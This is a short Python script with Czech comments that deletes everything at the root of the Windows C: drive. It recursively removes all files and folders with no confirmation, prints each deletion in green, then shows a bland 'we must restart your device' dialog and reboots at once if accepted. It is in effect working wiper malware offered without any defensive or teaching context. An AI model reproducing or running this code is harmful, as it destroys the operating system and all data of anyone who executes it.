import os
import shutil
import ctypes

# Funkce pro nastaveni barvy textu na zelenou v CMD
def set_green_text():
    ctypes.windll.kernel32.SetConsoleTextAttribute(ctypes.windll.kernel32.GetStdHandle(-11), 0x0A)

# Funkce pro reset barvy na standardní
def reset_text():
    ctypes.windll.kernel32.SetConsoleTextAttribute(ctypes.windll.kernel32.GetStdHandle(-11), 0x07)

# Cesta ke slozce
folder_path = r"C:\\"

# Zkontrolujeme existenci slozky
if not os.path.exists(folder_path):
    set_green_text()
    print(f"Slozka neexistuje: {folder_path}")
    reset_text()
else:
    # Projdeme vsechny polozky primo ve slozce
    for item in os.listdir(folder_path):
        item_path = os.path.join(folder_path, item)
        try:
            if os.path.isfile(item_path) or os.path.islink(item_path):
                os.remove(item_path)
                set_green_text()
                print(f"Uspešne vymazano: {item_path}")
                reset_text()
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
                set_green_text()
                print(f"Uspešne vymazano: {item_path}")
                reset_text()
        except Exception as e:
            set_green_text()
            print(f"Chyba pri mazani {item_path}: {e}")
            reset_text()

set_green_text()
print(f"\nVsechny polozky ve slozce byly odstraneny: {folder_path}")
reset_text()

# Zobrazeni dialogu pro restart
MB_YESNO = 0x04
MB_ICONQUESTION = 0x20
IDYES = 6

result = ctypes.windll.user32.MessageBoxW(0, "Musíme restartovat vaše zařízení.", "Restart počítače", MB_YESNO | MB_ICONQUESTION)

if result == IDYES:
    set_green_text()
    print("Počítač se restartuje...")
    reset_text()
    os.system("shutdown /r /t 0")
else:
    set_green_text()
    print("Počítač nebude restartován.")
    reset_text()
